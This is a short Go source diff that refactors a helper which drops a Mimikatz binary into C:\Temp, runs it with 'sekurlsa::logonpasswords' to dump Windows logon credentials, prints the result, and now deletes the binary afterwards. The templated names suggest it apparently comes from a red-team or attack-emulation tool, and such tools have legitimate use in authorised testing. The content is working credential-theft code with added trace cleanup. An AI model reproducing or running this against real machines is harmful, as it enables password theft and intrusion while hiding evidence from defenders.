@@ -10,7 +10,7 @@ import (
 )
 
 var TempDir = "C:\\Temp"
-var MimikatzFilename = "MIMIKATZFILENAME.exe"
+var MimikatzFullPath = TempDir + "\\" + "MIMIKATZFILENAME.exe"
 
 func GETHELPER() error {
 	jobUuid := os.Args[1]
@@ -41,8 +41,10 @@ func GETHELPER() error {
 
 func WRITEMIMIKATZFILETOTEMPDIR(data string) error {
 	err := os.MkdirAll(TempDir, os.ModePerm)
-	filename := TempDir + "\\" + MimikatzFilename
-	file, err := os.Create(filename)
+	if err != nil {
+		return err
+	}
+	file, err := os.Create(MimikatzFullPath)
 	if err != nil {
 		return err
 	}
@@ -59,11 +61,15 @@ func RUNMIMIKATZ() {
 	if err != nil {
 		fmt.Println(err)
 	}
-	mimikatzOut, err := exec.Command(TempDir+"\\"+MimikatzFilename, "privilege::debug", "sekurlsa::logonpasswords", "exit").Output()
+	mimikatzOut, err := exec.Command(MimikatzFullPath, "privilege::debug", "sekurlsa::logonpasswords", "exit").Output()
 	if err != nil {
 		fmt.Println(err)
 	}
 	fmt.Println(string(mimikatzOut))
+	err = os.Remove(MimikatzFullPath)
+	if err != nil {
+		fmt.Println(err)
+	}
 }
 
 func main() {
